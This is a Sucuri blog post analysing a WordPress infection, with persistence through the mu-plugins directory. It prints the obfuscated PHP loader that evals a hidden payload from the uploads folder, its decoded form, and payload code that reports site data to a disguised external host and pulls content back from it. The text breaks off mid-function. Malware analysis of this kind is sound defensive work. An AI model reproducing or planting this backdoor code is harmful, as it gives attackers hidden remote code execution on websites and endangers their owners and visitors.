---
title: Hidden Backdoors Uncovered in WordPress Malware Investigation
url: https://blog.sucuri.net/2025/02/hidden-backdoors-uncovered-in-wordpress-malware-investigation.html
source: Sucuri Blog
date: 2025-02-15
fetch_date: 2025-10-06T20:34:51.462730
---

# Hidden Backdoors Uncovered in WordPress Malware Investigation

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Hidden Backdoors Uncovered in WordPress Malware Investigation

[![](https://secure.gravatar.com/avatar/3bb7fb42c6bf04c758d570c2f6bb217266c127e77766dc9d8e6754f15cdd5867?s=60&d=mm&r=g)](https://blog.sucuri.net/author/puja-srivastava)

[Puja Srivastava](https://blog.sucuri.net/author/puja-srivastava)

* February 14, 2025

![Hidden Backdoors Uncovered in WordPress Malware Investigation](https://blog.sucuri.net/wp-content/uploads/2025/02/Investigating-a-WordPress-Malware-Incident_-Uncovering-Hidden-Backdoors-820x385.png)

At Sucuri, we often encounter cases where malware is deeply embedded in websites, hidden in files and scripts that can easily escape detection. In this article, we’ll walk you through a real-life incident where a customer contacted us about unusual behavior on their WordPress website. After a detailed investigation, we uncovered multiple backdoors allowing attackers to execute malicious code remotely.

## What was discovered?

During our scan, we found a suspicious file located in /wp-content/mu-plugins/index.php.

What are **mu-plugins** in WordPress?

mu-plugins (Must-Use Plugins) is a special directory in WordPress located at:

```
/wp-content/mu-plugins/
```

Unlike regular plugins, must-use plugins are automatically loaded on every page load, without needing activation or appearing in the standard plugin list. Attackers exploit this directory to maintain persistence and evade detection, as files placed here execute automatically and are not easily disabled from the WordPress admin panel. This makes it an ideal location for backdoors, allowing attackers to execute malicious code stealthily.

The file contained the following obfuscated PHP code:

```
<?php
$a = 'ba'.'se' . '64_de'.'co'.'de';
$get_file = $a('ZmlsZV9nZXRfY29udGVudHM=', true);
$wp_get_content = $get_file($_SERVER['DOCUMENT_ROOT']. '/' .call_user_func($a, 'd3AtY29udGVudC91cGxvYWRzLzIwMjQvMTIvaW5kZXgudHh0'));
$final = $a($wp_get_content, true);
eval('?>'.$final);
?>
```

Here’s the decoded version of this code:

```
<?php
$a = 'ba'.'se' . '64_de'.'co'.'de';
$get_file = $a('file_get_contents', true);
$wp_get_content = $get_file($_SERVER['DOCUMENT_ROOT']. '/' .call_user_func($a, 'wp-content/uploads/2024/12/index.txt'));
$final = $a($wp_get_content, true);
eval('?>'.$final);
?>
```

This PHP code is designed to execute a hidden payload stored in a file on the server. It is used to read the contents of a specific file. The exact path to this file is obfuscated using base64 encoding, which, when decoded, points to a file **/wp-content/uploads/2024/12/index.txt**.

Once the contents of this file are retrieved, the resulting PHP code is executed using **eval()**. This technique allows attackers to inject and execute arbitrary code while keeping the actual payload hidden in an external file, making detection more difficult.

This file **/wp-content/uploads/2024/12/index.txt** contained an additional layer of obfuscated PHP code, which, once decoded, revealed another base64-encoded payload designed to execute arbitrary commands on the compromised website.

Here’s the explanation after decoding it:

It begins by decoding a URL-encoded string and determining whether the connection is using HTTPS or HTTP. Based on this information, it constructs a URL by appending the decoded string (**$xmlname**) with additional parameters.

```
$xmlname = urldecode('162-er103-1.ivyrebl.fvgr');
$http = is_https() ? 'https' : 'http';
$duri_tmp = drequest_uri();
$duri = empty($duri_tmp) ? '/' : $duri_tmp;
$goweb = str_rot13($xmlname);
$host = htmlspecialchars(isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '', ENT_QUOTES, 'UTF-8');
$lang = htmlspecialchars(isset($_SERVER["HTTP_ACCEPT_LANGUAGE"]) ? $_SERVER["HTTP_ACCEPT_LANGUAGE"] : '', ENT_QUOTES, 'UTF-8');
$urlshang = htmlspecialchars(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '', ENT_QUOTES, 'UTF-8');
$web1 = $http . '://' . $goweb . '/index.php';
$web = $web1 . '?web=' . $host . '&zz=' . (disbot() ? '1' : '0') . '&uri=' . urlencode($duri) . '&urlshang=' . urlencode($urlshang) . '&http=' . $http . '&lang=' . $lang;
```

The code then sends a request to an external server with the constructed URL. Then a function **doutdo()** tries to fetch content from the constructed URL. The function first attempts to use **file\_get\_contents()** with a Googlebot user-agent. If that fails, it falls back on cURL to retrieve the content.

```
function doutdo($web)
{
    $options = [
        "http" => [
            ...